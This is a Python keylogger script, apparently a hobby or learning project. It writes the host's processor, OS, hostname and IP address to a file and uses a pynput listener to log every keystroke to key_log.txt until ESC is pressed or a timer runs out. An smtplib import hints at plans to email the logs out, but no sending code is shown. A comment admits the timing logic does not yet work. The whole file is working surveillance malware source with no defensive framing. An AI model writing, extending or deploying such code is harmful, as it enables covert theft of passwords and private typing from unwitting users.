import smtplib
import socket
import platform
from pynput.keyboard import Key, Listener
import time
import os



# Finds the directory script is running
script_directory = os.path.dirname(os.path.abspath(__file__))

# Define the folder path for log files in the same folder as the script
file_path = script_directory

# File extensions
extend = "\\"
system_information = "system.txt"
keys_information = "key_log.txt"

# Time Controls
time_iteration = 15  # 7200 seconds (2 hours)
number_of_iterations_end = 2  # 5000

# Create the directory if it doesn't exist
if not os.path.exists(file_path):
    os.makedirs(file_path)

def computer_information():
    with open(os.path.join(file_path, system_information), "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")

computer_information()

# Time controls for keylogger (doesnt yet work)
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    counter = 0

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(os.path.join(file_path, keys_information), "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

#Breaks logging on ESC
    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()



def create_file_if_not_exists(file_path):
    try:
        with open(file_path, "a") as f:
            pass
    except Exception as e:
        print(f"Error creating or accessing the file: {str(e)}")

# Add this function call to create the necessary files
create_file_if_not_exists(os.path.join(file_path, system_information))
create_file_if_not_exists(os.path.join(file_path, keys_information))